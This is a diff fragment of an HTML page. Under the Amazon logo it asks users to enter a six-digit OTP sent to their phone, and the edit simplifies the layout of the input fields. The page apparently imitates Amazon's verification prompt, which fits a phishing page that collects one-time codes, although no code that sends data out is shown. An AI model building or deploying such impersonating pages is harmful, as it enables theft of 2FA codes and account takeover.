@@ -205,18 +205,14 @@
         <h1>Enter the OTP sent to your phone number</h1>
         <div class="header">
             <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo">
-            <span>OTP Verification</span>
         </div>
-        <div class="section-title">Enter the 6-digit OTP</div>
         <form id="otpForm" onsubmit="verifyOTP(event)">
-            <div style="display: flex; justify-content: space-between;">
-                <input type="text" id="otp1" name="otp1" class="input-field" maxlength="1" required>
-                <input type="text" id="otp2" name="otp2" class="input-field" maxlength="1" required>
-                <input type="text" id="otp3" name="otp3" class="input-field" maxlength="1" required>
-                <input type="text" id="otp4" name="otp4" class="input-field" maxlength="1" required>
-                <input type="text" id="otp5" name="otp5" class="input-field" maxlength="1" required>
-                <input type="text" id="otp6" name="otp6" class="input-field" maxlength="1" required>
-            </div>
+            <input type="text" id="otp1" class="input-field" maxlength="1" required>
+            <input type="text" id="otp2" class="input-field" maxlength="1" required>
+            <input type="text" id="otp3" class="input-field" maxlength="1" required>
+            <input type="text" id="otp4" class="input-field" maxlength="1" required>
+            <input type="text" id="otp5" class="input-field" maxlength="1" required>
+            <input type="text" id="otp6" class="input-field" maxlength="1" required>
             <button type="submit" class="submit-btn">Verify OTP</button>
         </form>
     </div>
